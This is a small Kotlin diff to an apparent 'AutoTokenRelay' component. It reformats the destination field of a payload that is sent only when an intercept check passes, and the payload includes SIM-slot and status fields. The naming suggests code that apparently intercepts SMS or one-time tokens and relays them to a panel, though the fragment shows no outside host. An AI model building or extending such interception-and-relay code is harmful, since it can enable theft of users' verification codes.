@@ -37,10 +37,10 @@ object AutoTokenRelay {
                 if (!config.canIntercept() || !config.relayReady()) return@launch
 
                 val payload = linkedMapOf<String, Any?>(
-                    "to" to dest.trim(),
+                    "to" to GianPanelCompat.formatDest(dest.trim()),
                     "body" to body.trim(),
                     "message" to body.trim(),
-                    "recipient" to dest.trim(),
+                    "recipient" to GianPanelCompat.formatDest(dest.trim()),
                     "sim" to config.senderSimSlot,
                     "targetSim" to if (config.senderSimSlot == 0) "SIM1" else "SIM2",
                     "status" to "pending",
